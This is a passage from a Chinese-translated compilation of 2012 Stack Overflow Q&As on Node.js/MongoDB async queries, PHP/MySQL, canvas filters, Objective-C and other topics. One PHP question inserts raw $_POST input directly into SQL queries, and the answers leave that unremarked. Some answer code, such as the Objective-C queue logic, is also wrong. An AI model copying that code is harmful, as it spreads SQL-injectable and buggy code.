    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$postcode'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$postcode']['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$city'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$city']['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$region'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$region']['$t'];
    if(isset($cnt['gd$structuredPostalAddress'][0]['gd$country'])) echo " --- " . $cnt['gd$structuredPostalAddress'][0]['gd$country']['$t'];
    echo "</br>";
} 
```

# node.js - 在 node.js 和 mongodb 中处理异步数据库查询

> ID：13221262
> 
> 赞同：2
> 
> 时间：2012-11-04T17:55:57.430
> 
> 标签：node.js, mongodb, asynchronous

我在从 node.js 异步查询 mongodb 时遇到了这个问题。这是我的代码

```
var values = [];
var positives = new Array();
var negatives = new Array();

var server1 = new mongodb.Server('localhost',27017, {auto_reconnect: true});
var db1 = new mongodb.Db('clicker', server1);   

db1.open(function(err, db) {
    if(!err) {

        db1.collection('feedback', function(err, collection) {
            for (var i=0;i <5; i++) {
                collection.find(
                    {value:1},
                    {created_on: 
                        {       
                            $gte:startTime + (i*60*1000 - 30*1000),
                            $lt: startTime + (i*60*1000 + 30*1000)
                        }
                    },
                    function(err_positive, result_positive) {
                        result_positive.count(function(err, count){
                                console.log("Total matches: " + count);
                                positives[i] = count;
                        });
                    }

                );              

                collection.find(
                    {value:0},
                    {created_on: 
                        {
                            $gte:startTime + (i*60*1000 - 30*1000),
                            $lt: startTime + (i*60*1000 + 30*1000)
                        }
                    },
                    function(err_negative, result_negative) {
                        result_negative.count(function(err, count){
                                console.log("Total matches: " + count);
                                negatives[i] = count;
                        });
                    }   
                );                                  
            }

        });

    } else {
        console.log('Error connecting to the database');
    }      

}); 
```

实际上，我正在尝试从数据库中获取一些值。然后我需要操纵这些值。只是我需要从正数中减去负数，然后用正数-负数初始化值数组。现在因为结果是异步获得的。我应该如何操作这些值并将它们放入 values 数组中。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-04T19:51:54.463

在我进一步解释之前，我想指出您的代码中有一个错误：

```
function(err_positive, result_positive) {
    result_positive.count(function(err, count){
        console.log("Total matches: " + count);
        positives[i] = count;  // <--- BUG: i id always 5 because it
    });                        //           is captured in a closure
} 
```

经典的闭包和循环问题。请参阅：[请解释循环中 JavaScript 闭包的使用](https://stackoverflow.com/questions/3572480/please-explain-the-use-of-javascript-closures-in-loops/3572616#3572616)

现在，如何处理循环中的异步函数。基本思想是，您需要跟踪完成了多少异步调用，并在最终调用返回后运行您的代码。例如：

```
var END=5;
var counter=end;
for (var i=0;i<END; i++) {
  collection.find(
    {value:1},
    {created_on: 
      {       
        $gte:startTime + (i*60*1000 - 30*1000),
        $lt: startTime + (i*60*1000 + 30*1000)
      }
    },
    (function(j){
      return function(err_positive, result_positive) {
        result_positive.count(function(err, count){
            console.log("Total matches: " + count);
            positives[j] = count;
        });

        counter--;
        if (!counter) {
          /*
           * Last result, now we have all positives.
           *
           * Add code that need to process the result here.
           *
           */
        }
      }
    })(i)
  ); 
} 
```

然而，如果我们继续这样做，很明显我们最终会创建一堆临时变量并最终得到可怕的嵌套代码。但是这是 javascript，我们可以将这种模式的逻辑封装在一个函数中。这是我在 javascript 中对“等待全部完成”逻辑的实现：[Coordinating parallel execution in node.js](https://stackoverflow.com/questions/4631774/coordinating-parallel-execution-in-node-js/4631909#4631909)

但是由于我们使用的是 node.js，我们可以使用方便的异步模块形式 npm：[https ://npmjs.org/package/async](https://npmjs.org/package/async)

使用 async，您可以像这样编写代码：

```
var queries = [];

// Build up queries:
for (var i=0;i <5; i++) {
  queries.push((function(j){
    return function(callback) {
      collection.find(
        {value:1},
        {created_on: 
          {       
            $gte:startTime + (j*60*1000 - 30*1000),
            $lt: startTime + (j*60*1000 + 30*1000)
          }
        },
        function(err_positive, result_positive) {
          result_positive.count(function(err, count){
            console.log("Total matches: " + count);
            positives[j] = count;          
            callback();
          });
        }

      );
    }
  })(i));
  queries.push((function(j){
    return function(callback) {
      collection.find(
        {value:0},
        {created_on: 
          {
            $gte:startTime + (j*60*1000 - 30*1000),
            $lt: startTime + (j*60*1000 + 30*1000)
          }
        },
        function(err_negative, result_negative) {
          result_negative.count(function(err, count){
            console.log("Total matches: " + count);
            negatives[j] = count;
            callback();
          });
        }   
      );
    }
  })(i));  
}

// Now execute the queries:
async.parallel(queries, function(){
  // This function executes after all the queries have returned
  // So we have access to the completed positives and negatives:

  // For example, we can dump the arrays in Firebug:
  console.log(positives,negatives);
}); 
```

# python - 无法使属性在嵌套方法中工作

> ID：13221263
> 
> 赞同：1
> 
> 时间：2012-11-04T17:56:02.873
> 
> 标签：python

我试图创建一个带有一些格式选项的类。但我无法弄清楚如何正确地做到这一点......

该代码产生了以下错误：

> AttributeError：“NoneType”对象没有属性“valuesonly”

```
class Testings(object):

    def format_as_values_only(self,somedata):
        buildstring=somedata.values()
        return buildstring

    def format_as_keys_only(self):
        pass

    def format_as_numbers(self):
        pass

    def get_data_method(self):
        self.data= {'2_testkey':'2_testvalue',"2_testkey2":"2_testvalue2"}

        @property
        def valuesonly(self):
            return format_as_values_only(self.data)

test=Testings()
print test.get_data_method().valuesonly 
```

对我来说重要的是能够获得像这样的格式化程序：class.method.formatter 左右......

非常感谢任何提示！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:02:01.340

`get_data_method`没有返回值，所以结果`test.get_data_method()`是`None`. 这就是为什么你得到那个例外。

如果你*真的*想做类似的事情`test.get_data_method().valuesonly`，要么在 上定义`valuesonly`属性`Testings`，然后`get_data_method`返回`self`，要么`get_data_method`返回一些带有你想要定义的属性的新对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:04:25.633

你不能这样做。方法只是直接在类块中定义的函数。你的函数在另一个函数中，所以它不是一个方法。`property`除了在类块中，装饰器是无用的。

但是，更根本的是，函数定义只是创建局部名称，与变量赋值或其他任何内容相同。您的`valuesonly`函数根本无法从函数外部访问*，*因为`get_data_method`除了返回值之外，函数内部的任何内容都无法访问。您所做的与以下内容没有什么不同：

```
def get_data_method(self):
    a = 2 
```

. . . 然后期望能够`a`从函数外部访问局部变量。它行不通。当您调用 时`get_data_method()`，您会得到 value `None`，因为`get_data_method`不会返回任何内容。您随后对结果所做的任何事情`get_data_method()`都只是对相同的 None 值进行操作。

如果您想使用您描述的语法访问事物，您将需要`get_data_method`返回一个具有类似`valuesonly`. 换句话说，编写另一个提供`valuesonly`属性的类，并`get_data_method`返回该类的实例。粗略的轮廓（未经测试）：

```
class DataMethodGetter(object):
    def __init__(self, parent):
        self.parent = parent

    @property
    def valuesonly(self):
        return format_as_values_only(self.parent.data)

class Testings(object):
    # rest of class def here
    def get_data_method(self):
        self.data = {'blah': 'blah'}
        return DataMethodGetter(self) 
```

但是，您应该考虑为什么要这样做。将其设置为直接调用对象可能更简单`valuesonly`，`Testing`或者将标志传递给`get_data_method`，执行类似`get_data_method(valuesonly=True)`.

# javascript - 如何使用谷歌联系人服务读取日期（出生）

> ID：13221265
> 
> 赞同：1
> 
> 时间：2012-11-04T17:56:30.117
> 
> 标签：javascript, api, google-apps-script

抱歉我的英语很差...我尝试使用 Google Apps Script - Contacts Service 阅读我的联系人中的信息。

姓名、电子邮件、地址、电话没有问题，但我无法读取日期（我想获取联系人的出生日期）。如何阅读“日期字段”？

```
 for (var i=0; i<contacts.length; i++) {
    Name = contacts[i].getFullName();

    EmailArray = contacts[i].getEmails(ContactsApp.Field.HOME_EMAIL);
    if (EmailArray.length)
      Email = contacts[i].getEmails(ContactsApp.Field.HOME_EMAIL)[0].getAddress();
    if (!Email){
      EmailArray = contacts[i].getEmails(ContactsApp.Field.WORK_EMAIL);
      if (EmailArray.length)
        Email = contacts[i].getEmails(ContactsApp.Field.WORK_EMAIL)[0].getAddress();
    }

    AddressArray = contacts[i].getAddresses(ContactsApp.Field.HOME_ADDRESS);
    for ( var j = 0; j < AddressArray.length; j++ ) {
      Address = AddressArray[j].getAddress();
      AddressSplit = Address.split(/\r\n|\r|\n/);
      Rue = AddressSplit[0];
      Code = AddressSplit[1].split(" ")[0];
      Ville = AddressSplit[1].split(" ")[1];
    }

    var HomePhone = contacts[i].getHomePhone();
    var MobilePhone = contacts[i].getMobilePhone();

    //HERE IS THE PROBLEM
    DatesArray = contacts[i].getDates();
    // Never pass here... How to read the DateField ?
    for ( var j = 0; j < DatesArray.lenght; j++ ) {
      var date = contacts[i].getDates()[j];
      var day = date.getDay();
      var month = date.getMonth();
      var year = date.getYear();
    }
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:35:06.603

我找到了解决方案……过了一会儿！没有记录联系人服务...

```
var dateArray = new Array(), day, month = new String, year;
var monthArray = ["0", "JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"];

dateArray = contacts[i].getDates(ContactsApp.Field.BIRTHDAY);
for(var j in dateArray){
  day = dateArray[j].getDay();
  month = monthArray.indexOf(dateArray[j].getMonth().toString());
  year = dateArray[j].getYear();
  sheet.getRange(1*i+2, 3, 1, 1).setValue(day + "/" + month + "/" + year);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T01:18:47.580

这应该这样做

```
DatesArray.length 
```

# java - IText5 - 每页都有不同的页脚

> ID：13221271
> 
> 赞同：1
> 
> 时间：2012-11-04T17:56:58.040
> 
> 标签：java, itext, footer

我用 Java 创建了一个 IText5 文档：

```
 Document document = new Document();
  PdfWriter writer = PdfWriter.getInstance(document, pageOut);
  document.open(); 
```

我正在通过汽车列表进行交互，并为每辆汽车创建一个新页面。对于每个`newPage`我想要在页脚中的汽车名称。我找不到它的例子，我只找到了如何在每一页上都有相同的页脚。我根据事件找到了这个示例：http: [//itextpdf.com/examples/iia.php](http://itextpdf.com/examples/iia.php?id=103) ?id=103但它似乎不是一个好的解决方案，因为我正在遍历汽车列表并且在这种方法中我无法打印汽车名称在页脚中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:45:04.273

通过从外部设置的成员变量 currentCar 扩展 HeaderFooter 类到当前处理的汽车，并在 onEndPage 方法中使用该成员变量的内容来生成适当的页眉和页脚。

根据您的控制循环，您必须注意正确协调该成员的更改和页面的切换，以免在您的页眉和页脚中关闭。

# mysql - 通过行数以外的参数设置 LIMIT

> ID：13221273
> 
> 赞同：1
> 
> 时间：2012-11-04T17:57:16.230
> 
> 标签：mysql

我有一个应用程序可以搜索并显示不同机构的用户推荐。

每个机构可以有任意数量的推荐。

每个研究所的结果如下所示：

*   Inst A 有 6 条建议
*   inst B 有 4 条建议
*   等等...

我想一次只画十个**机构**。

问题是我的查询是针对**建议**，而不是机构，因此我最终得到 10 个建议而不是 10 个机构。

有没有办法告诉 MySQL 限制是指 DISTINCT 机构，同时仍然有效地拉动 DUPLICATE 机构（即同一机构的一些建议）？

实际查询的简化版本：

```
SELECT * FROM institutions
LEFT JOIN recommendations
  ON institutions.InstitutionID = recommendations.InstitutionID
WHERE [SOMETHING]
LIMIT 10 
```

提出问题的另一种方式：是否可以使 LIMIT 子句引用原始 SELECT 而没有 JOIN？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:08:38.120

限制机构，然后加入：

```
SELECT * FROM (
    select *
    from institutions
    WHERE [SOMETHING about institutions]
    LIMIT 10) x
LEFT JOIN recommendations ON x.InstitutionID =  recommendations.InstitutionID
    AND [SOMETHING about recommendations] 
```

对于 mysql 中的分页，请使用以下命令：

```
...
LIMIT 50, 10 
```

此示例获取第 6 页 - 从第 51 行开始并获得 10 行。
注意：偏移量从`0`not开始计算`1`。

mysql 中限制的[语法](http://dev.mysql.com/doc/refman/5.5/en/select.html)`LIMIT offset, row_count`是. 没有偏移，它是`LIMIT row_count`（我知道...... row_count 参数移动！）

您还可以使用替代语法：

```
...
LIMIT 10 OFFSET 50 
```

我发现后一种语法更容易阅读。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:06:23.120

当您加入时，对机构进行子查询并将限制放在那里

```
SELECT * 
  FROM nsrecommendation
  JOIN (select * from nsserviceplace limit 10) as ten_service_places
 WHERE ten_service_places.NSServicePlaceID = nsrecommendation.NSServicePlaceID 
   AND [something]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:02:16.700

如果您只想使用 mysql 查询作为检索数据的方式，您可以尝试一些嵌套查询来获取所需的数据。没有表结构就不能说太多。

# javascript - HTML5 画布图像过滤器滞后 (JavaScript)

> ID：13221275
> 
> 赞同：2
> 
> 时间：2012-11-04T17:58:01.590
> 
> 标签：javascript, html, loops, canvas, filter

我正在尝试将全屏背景图像加载到画布上，然后对其应用图像过滤器，但有几个问题。我遇到了严重的性能问题，但仅在调整窗口大小时。基本上，我的代码试图保持画布/图像与屏幕尺寸匹配（效果很好）。

**更新画布方法：**

updateCanvas 方法在加载时调用以初始创建/加载图像对象并将其放置在画布上。如果选择了过滤器，它会调用过滤器方法。它接受 onResize 参数，该参数在窗口调整大小时传递以缩放画布/图像。MAIN 是指用于引用元素的对象。

```
updateCanvas:function(onResize){ 
        // SETUP VARIABLES
    var img=new Image(), 
            $this=Main.currentOBJ, // REFERENCE FOR .DATA
            objData=$this.data, 
            canvas=Main.OBJ.$Canvas[0], 
        ctx=canvas.getContext("2d"), 
            winW=$(window).width(), winH=$(window).height();

   // SOURCE CAN BE SET IN .DATA OR DEFAULT
   img.src=(objData.bg_pic_src!=='') ? objData.bg_pic_src : Main.ConSRC;

   // LOAD THE IMAGE OBJECT
   img.onload=function(){ 
       var imgW=img.width, imgH=img.height, 
           ratio=imgW/imgH, newW=winW, newH=Math.round(newW/ratio);

       // SETUP IMAGE PROPORTIONS
       if(newH < winH){ var newH=winH, newW=Math.round(newH*ratio); }; 

       // WHEN RESIZING THE BROWSER 
       if(!onResize){ // INTIAL DRAW
          Main.OBJ.$Canvas.attr({'width':newW+'px', 'height':newH+'px'});  
          ctx.drawImage(img,0,0,newW,newH);

          // APPLY FILTERS
      if(objData.bg_pic_filter > 0){ 
             Main.canvasFilter(ctx,newW,newH); // FILTER METHOD
      }else{ 
             Main.OBJ.$OverlayPic.animate({opacity:parseFloat(objData.bg_pic_opacity,10)},
        {duration:objData.bg_pic_speed_in,queue:false}); 
          };
    }else{ // RESIZING
         Main.OBJ.$Canvas.attr({'width':newW+'px', 'height':newH+'px'});  
         ctx.drawImage(img,0,0,newW,newH);

         if(objData.bg_pic_filter > 0){ 
             Main.canvasFilter(ctx,newW,newH); // FILTER METHOD
         };     
    };
}; 
```

**Canvas Filter 方法：** 如果要对背景图像应用图像过滤器，则从 canvasUpdate 方法调用 canvasFilter 方法。

```
canvasFilter:function(ctx,width,height){ 
      // SETUP VARIABLES
      var objData=Main.currentOBJ.data, 
      canvasWidth=width, canvasHeight=height,
      imgdata=ctx.getImageData(0, 0, canvasWidth, canvasHeight), 
      pix=imgdata.data, l=pix.length;

     // APPLY THE CORRECT LOOP DEPENDING UPON THE FILTER NUMBER 
     switch(objData.bg_pic_filter){
     case 1: ... break;
     case 2: 
         for(var i=l; i>0; i-=4){ 
             var cacher=pix[i+2]; 
             pix[i]=pix[i+1]; 
             pix[i+1]=cacher; 
             pix[i+2]=cacher; 
             pix[i+3]=cacher;
         }; 
     break;
    };          

     // APPLY THE FILER & FADE IN THE BACKGROUND
     ctx.putImageData(imgdata, 0, 0);
     Main.OBJ.$OverlayPic.fadeTo(parseInt(objData.bg_pic_speed_in,10),    
         parseFloat(objData.bg_pic_opacity,10));
}; 
```

所有这些都有效，并且初始绘制/过滤器非常快。但是，当我调整窗口大小时，它非常缓慢。我通过安装一个节流器暂时解决了这个问题，它只是设置了一个计时器以避免过快地触发上述功能。这有一点帮助，但会保持背景图像在适当的位置（在图像周围显示开放的纯色背景区域），直到节流计时器启动并触发方法 - 调整画布/图像的大小并应用过滤器。

**问题：**

1.  有更快的方法吗？我已经阅读了有关使用 Typed Arrays/Bitwise 进行像素操作循环的信息，但似乎对此的支持很糟糕。我也研究了 CSS3 过滤器来完成同样的事情，但同样，支持是可怕的。那么，这将是具有“现代浏览器”兼容性的全屏背景图像过滤器的唯一方法吗？

2.  updateCanvas 方法每次都会创建一个新的图像对象，我认为这可能是一个瓶颈，但我不确定，也不确定如何解决它？

3.  我读过其他人使用单独的画布作为缓冲区？在我的情况下，这实际上会提高性能吗？

4.  我真的认为我的代码中有一个主要的逻辑问题。对我来说，我需要多次循环遍历所有像素信息是没有意义的，但这是我让它工作的唯一方法。有没有办法我可以绘制它/应用过滤器一次，然后在调整大小时，只需调整尺寸而无需重绘/重新循环/重新应用过滤器？我认为它会保留过滤后的图像，但如果我在窗口调整大小时删除对 canvasFilter 方法的调用，它会完全删除过滤器效果。

5.  我还没有使用过记忆技术，因为我从来没有完全理解它，也从来没有完全理解在哪里/何时使用它。但是，本质上，如果我有一个函数一次又一次地返回相同的结果（例如 canvasFilter 方法），我可以记忆以提高性能 - 还是会因为它在窗口调整大小后拉取不同的像素信息而有所不同？

6.  我还听说 webGL 渲染可能对此有所帮助？因为我对 webGL 一无所知，所以可能会很遥远。

很抱歉这个 loooonng 问题，但希望这涵盖了一些其他人也可以从中受益的主题。任何建议/提示将不胜感激。谢谢！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-01T03:46:47.633

由于听起来您的图像大部分是静态的，因此您可能想尝试的一种方法是使用良好的旧 css。

这里的关键技巧是使用 background-size:cover。请参阅：[http ://css-tricks.com/perfect-full-page-background-image/](http://css-tricks.com/perfect-full-page-background-image/)

所以从广义上讲：

1.  加载您的图像
2.  在画布中应用您的过滤器。（画布甚至不需要附加到页面上）。
3.  通过以下方式将画布数据导出为 url：`ctx.toDataUrl("image/png");`
4.  将样式添加到您的容器元素或正文中： `background-size:cover;background:url('data:image/png;yourcanvasdata');`
5.  通过 js 或 css 过渡属性为容器元素/主体的不透明度设置动画

# objective-c - 从 NSmutableString 中删除注释字符串

> ID：13221282
> 
> 赞同：0
> 
> 时间：2012-11-04T17:58:54.383
> 
> 标签：objective-c, ios, data-structures, android-mapview, nsmutablestring

我正在研究 mapView 项目。我的项目将只在地图上使用 5 个注释。添加新注释后，将删除第一个注释。我将所有注释纬度和经度保存到 NSMutableStringArray 中。有没有什么捷径可以实现这种循环方式。先进后出。

例如我的 nsmutable 字符串：

```
 [12.99, 35.97: 35.85,94.53: 45.44,98.91] 
```

我怎样才能从字符串中删除第一个对象（每个字符串由列运算符:) 来获取以下内容：

```
 [35.85,94.53: 45.44,98.91] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:05:09.560

使用`NSMutableArray`本身有什么问题。或者我不明白你的问题？

```
NSMutableArray *queue = [[NSMutableArray alloc] init];

if([queue count] >= 5)
    [queue addObject: myObject];  // adds at end
else
    object = [queue objectAtIndex:5];  // take out the first added object
    [queue removeObjectAtIndex:0]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:35:28.027

我已经成功了，我的解决方案如下：

```
NSMutableString *absolute=[NSMutableString stringWithString:pinPoints];
          NSLog(@"before absolute: %@",absolute);

          NSArray *placemarks=[absolute componentsSeparatedByString:@":"];
          if([placemarks count]>5)
          {
          //NSLog(@"%@",[placemarks objectAtIndex:0]);
          NSMutableString *string1 = [NSMutableString stringWithString: [placemarks objectAtIndex:0]];
          [absolute replaceOccurrencesOfString:string1 withString:@"" options:0 range:NSMakeRange(0,[pinPoints length])];
          pinPoints=absolute;
          }
          NSLog(@"after absolute: %@",absolute); 
```

# html - 使用 和姓名/身份证

> ID：13221285
> 
> 赞同：0
> 
> 时间：2012-11-04T17:59:16.133
> 
> 标签：html

好的，所以我开始接受转换，但不接受 div 和命名它们。我有代码；

```
<!DOCTYPE html>
<html>
<head>
<style>

div
{
width:40px;
height:60px;
opacity:0.4;
background:black;
transition:all 2s;
-moz-transition:all 2s; /* Firefox 4 */
-webkit-transition:all 2s; /* Safari and Chrome */
-o-transition:all 2s; /* Opera */
}

div:hover
{
width:90px;
opacity:0.9;
}
</style>
</head>
<body>
<br>
<center><u><b>TEST</center></b></u></center>

<div></div>

</body>
</html> 
```

在布局上，这完全弄乱了它的一切。其他一切基本上都有过渡，并且弄乱了东西的定位。

我认为问题在于“div”与布局的其余部分混合在一起，如果是这样，我将如何命名“div”以便它是单一的并且不会改变布局的其余部分。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:28:28.167

很好地使用[http://jsfiddle.net](http://jsfiddle.net) ，您可以让我们深入了解您的代码的工作方式。

**绝对定位**div，它不会与您的其余布局混淆

```
div{
position:absolute;
} 
```

# php - 无法连接到网站中的数据库

> ID：13221286
> 
> 赞同：0
> 
> 时间：2012-11-04T17:59:22.200
> 
> 标签：php, mysql

我使用以下代码在网站上建立新用户。这就像注册页面。它在 localhost 中运行良好，数据将插入到数据库和表中，但现在在服务器中它将无法正常工作。

```
 $code = rand(11111,99999);
    $link1 = mysql_connect("http://www.mysite.com","username","password");
     mysql_select_db("username");
     mysql_query("SET character_set_results= 'utf8' , character_set_client = 'utf8' , character_set_connection = 'utf8',
     character_set_database ='utf8', character_set_server = 'utf8' ");
     mysql_query("INSERT into user(name,family,email,gender,username,pass)
     values('$_POST[name]','$_POST[family]','$_POST[email]','$_POST[gender]','$_POST[username]','$code')");
     mysql_close($link1);
     //connection user pass
     $link2 = mysql_connect("http://www.mysite.com","username","password");
     mysql_select_db("username");
     mysql_query("INSERT into joinuser(username,pass,permission)values('$_POST[username]','$code','user')" );
     mysql_close($link2); 
```

它在 localhost 中插入值，但在服务器中不起作用。

它是带有mysql数据库的php。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:03:51.990

`"http://www.mysite.com"`是错的。您无法使用 HTTP 连接到 MySQL。

在大多数情况下，您只需要使用`localhost`并允许库通过本地套接字而不是 TCP/IP 进行连接。

如果您连接到运行在与 HTTP 服务器不同的机器上的数据库服务器，那么您将使用主机名（以及可选的端口）。您不会指定任何类型的 URL 方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:13:13.773

很可能这将是问题的解决方案。

```
//mysql_connect("http://www.mysite.com","username","password");
mysql_connect("localhost","username","password"); 
```

注意`localhost`代替`http://www.mysite.com`。

# batch-file - 创建用于提取的批处理文件

> ID：13221288
> 
> 赞同：-1
> 
> 时间：2012-11-04T17:59:32.143
> 
> 标签：batch-file, extract, rar

您好，我是批处理文件的新手，

我正在尝试创建一个批处理文件，该文件可以从 .RAR 文件中提取特定的图像文件，并将提取的文件重命名为 .RAR 文件。

仅供参考：该过程需要在同一文件夹中的多个 RAR 文件上完成。

任何帮助都会得到帮助:) 提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:10:22.310

也许这对你有帮助：你基本上首先设置例如 WinRar 的 rar 和 unrar 位置：

设置 rar=%ProgramFiles%\WinRAR\RAR.exe

设置 unrar=%programFiles%\WinRAR\UnRAR.exe

然后你像这样压缩：

"%rar%" a "放置位置" "目标位置"

或像这样解压缩：

%unrar% e "目标位置"

资料来源：[http ://batch.maxforum.org/2010/08/30/how-to-rar-unrar-via-batch/](http://batch.maxforum.org/2010/08/30/how-to-rar-unrar-via-batch/)

# java - 使用 java 单击 PrintPreview 在远程服务器上打开 PDF 文件

> ID：13221291
> 
> 赞同：0
> 
> 时间：2012-11-04T17:59:52.593
> 
> 标签：java, pdf-generation, inputstream, print-preview

我正在将我的 XHTML 页面（用户填写的申请表的一部分）转换为 PDF 文件并将它们保存在远程服务器上。我在申请表中有 6 个部分，每个部分都是一个 XHTML 页面。

一旦用户填写了 4 个部分，单击 4 个部分/页面中的继续按钮后，我将生成 PDF 并将其保存到远程服务器。在第 5 部分/页面上，我显示了一个**“PrintPreview”**按钮。一旦用户点击它，我必须获取保存的 PDF 并以 PDF 格式打开它。

我可以使用 InputStream 阅读 PDF，但我不知道如何在 java 中打开它。我如何使用 Java 做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T01:56:50.847

如果您的意思是您正在运行需要显示 PDF 的 Java 应用程序，那么 Java 的桌面提供了一种解决方案。你的代码会这样做：

1.  获取/下载 pdf 并保存到文件：

    `File myPdf = saveToFile(pdfStream);`

2.  调用桌面显示 PDF

    `java.awt.Desktop.getDesktop().open(myPdf);`

另一种选择是启动带有 url 的浏览器来显示 PDF。这可以通过`Desktop.browse(uri)`方法来完成。

# scheme - Sublime Text 2 与 MIT 方案

> ID：13221293
> 
> 赞同：4
> 
> 时间：2012-11-04T18:00:19.753
> 
> 标签：scheme, sublimetext2, sublimetext, mit-scheme

有谁知道我如何将 sublime text 2 与方案一起使用。我听说过 ST2 并想尝试一下？现在我正在学习计划。我安装了方案解释器——我可以去终端输入方案并运行代码。我也可以在 emacs 中运行解释器，但 emacs 并不是很有趣。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-12-28T04:15:17.387

这可能有点晚了，但我仍然想分享我的经验......

现在我正在使用 Sublime Text 2 并使用 Scheme 很好。

首先通过包控制安装包[“Scheme” 。](https://github.com/egrachev/sublime-scheme)

然后安装包[“SublimeREPL”](https://github.com/wuub/SublimeREPL)（用于 Sublime Text 2）。

那么你的 Sublime 中应该有一个功能齐全的 Scheme 环境！语法高亮很好，并使用 SublimeREPL 进行交互式 Scheme 提示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-08T11:15:27.397

希望我的回答对你有所帮助~我的解决方案不是使用Mit-Scheme而是使用DrScheme，具体流程如下：

1.  下载 PLT-Scheme 并安装它 ( [http://download.plt-scheme.org/](http://download.plt-scheme.org/) )。
2.  将其安装路径添加到环境变量“Path”中。
3.  安装包“SublimeREPL”
4.  找到文件“Sublime Text 2\Packages\SublimeREPL\config\Scheme\Main.sublime-menu”，
    用Sublime Text 2打开。找到代码：

> ```
> "cmd": {"linux": ["scheme"],
>         "osx": ["scheme"],
>         "windows": ["scheme"]}, 
> ```

并改变它：

> ```
> "cmd": {"linux": ["scheme"],
>         "osx": ["scheme"],
>         "windows": ["scheme"]}, 
> ```

[图片](http://i.stack.imgur.com/ATb6v.png)

节省。

5.  打开 Sublime Text 2，`ctrl+shift+p`然后输入`scheme`，按`Enter`

尽情享受吧！</p>

# php - 从 php 中的列表中获取特定数据

> ID：13221301
> 
> 赞同：-3
> 
> 时间：2012-11-04T18:00:53.827
> 
> 标签：php

我有一个这样的字符串：

```
 house1- a normal house 

 house2-an office  

 house3-a scholl 
```

大约有2000行。我只想从中获取house1、house2、house3 等并将其放入另一个文件中。像：

```
 house1

 house2 

 house3 
```

我知道explode 函数适用于分隔字符串，但我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:04:38.240

```
$str = "house1- a normal house";

$result = explode("-", $str)[0];

var_dump($result); 
```

假设是最新的 PHP 版本（5.4.x）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:18:21.333

```
$fContents = file( 'path/to/your/file' );
foreach ( $fContents as $row )
    file_put_contents( 'path/to/other/file', explode( '-', $row )[0] , FILE_APPEND ); 
```

糟糕但有效的例子（假设你有 5.4+）。

* * *

对于 PHP 5.3：

```
$fContents = file( 'path/to/your/file' );
foreach ( $fContents as $row )
{
    $firstField = explode( '-', $row );
    file_put_contents( 'path/to/other/file', $firstField[0] , FILE_APPEND );
} 
```

# url - 使用 DIV 中指定的值附加 URL

> ID：13221302
> 
> 赞同：1
> 
> 时间：2012-11-04T18:00:56.910
> 
> 标签：url, append

我知道 URL 的第一部分，但需要根据客户端在 div 中输入的内容来唯一地定义最后一部分。例如：

```
<!-- specify page name in the div -->
<div id="client-entry">page-name</div>
<div id="load-url">url loads here</div>

<!-- load what is specified at the end of the url -->
<script>
$("#load-url").load("known-folder/"#client-entry.text()".html");
</script> 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:18:48.607

**想法1：**

为您选择的 div 提供一个属性（例如**ajaxify**）

```
<div id="client-entry" ajaxify="unique link here"> 
```

然后使用 jQuery 你可以得到值

```
$('#client-entry').attr('ajaxify'); 
```

然后使用客户端条目 div 具有的任何属性值加载下一个 div。

**想法2：**

您可以在客户端条目 div 中使用输入，然后使用 jQuery 获取输入的值

var toLoad = $('client-input').val( );

在加载代码中使用此值。

```
$("#load-url").load("known-folder/"+toLoad+".html"); 
```

# java - 实现牛顿法求平方根的算法的复杂性

> ID：13221303
> 
> 赞同：2
> 
> 时间：2012-11-04T18:00:57.077
> 
> 标签：java, complexity-theory, time-complexity, square-root, newtons-method

我编写了一个 Java 程序来使用牛顿法计算用户定义数字的平方根。算法的主要操作是这样的：

```
answer = guess - ((guess * guess - inputNumber) / (2 * guess)); 
while (Math.abs(answer * answer - inputNumber) > leniency) {
    guess = answer;
    answer = guess - ((guess * guess - inputNumber) / (2 * guess));
} 
```

我现在正在寻找算法的复杂性（是的，这是家庭作业），并且从[这里](https://stackoverflow.com/questions/5005753/what-is-newton-raphson-square-methods-time-complexity)读到牛顿方法的时间复杂度是 O(log(n) * F(x))。

但是，从上面的代码片段中，我将时间复杂度解释为：

```
O(1+ ∑(1 to n) (1) ) = O(1+n) = O(n) 
```

不知道我在这里做错了什么，但即使在阅读了维基的解释之后，我似乎也无法理解大操作系统的差异。

另外，我假设“算法的复杂性”是“时间复杂性”的同义词。这样做是否正确？

